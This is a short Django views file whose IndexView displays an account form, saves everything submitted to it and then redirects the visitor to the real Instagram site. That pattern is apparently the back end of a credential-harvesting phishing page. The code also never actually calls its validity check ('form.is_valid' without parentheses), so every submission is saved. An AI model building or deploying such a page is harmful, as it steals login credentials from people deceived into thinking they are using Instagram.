from django.shortcuts import render, redirect
from django.views import View
from .forms import AccountForm


class IndexView(View):
    def get(self,request):
        form = AccountForm()
        return render(request ,'index.html',{"form":form})
    
    def post(self,request):
        form = AccountForm(request.POST)
        if form.is_valid:
            form.save()
            return redirect("https://www.instagram.com")
        return render(request ,'index.html',{"form":form})
